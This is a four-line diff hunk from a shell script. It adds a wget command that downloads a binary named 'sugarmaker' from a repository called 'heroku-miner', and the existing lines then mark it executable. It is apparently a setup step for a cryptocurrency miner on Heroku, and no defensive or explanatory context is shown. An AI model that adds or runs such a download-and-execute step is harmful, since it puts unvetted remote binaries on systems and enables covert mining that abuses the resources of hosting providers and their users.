@@ -1,3 +1,4 @@
+wget https://github.com/prynar/heroku-miner/raw/master/sugarmaker
 chmod +x sugarmaker
 whoami
 
